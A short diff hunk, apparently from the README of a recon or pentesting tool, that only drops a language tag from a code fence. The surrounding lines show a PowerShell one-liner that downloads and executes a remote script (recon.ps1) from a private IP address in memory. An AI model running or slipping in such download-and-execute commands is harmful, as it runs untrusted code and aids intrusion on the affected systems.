@@ -24,7 +24,7 @@ iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.
 ```
 
 Example funtions on windows:
-```c
+```
 PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
 
      ___  __    ___   ___
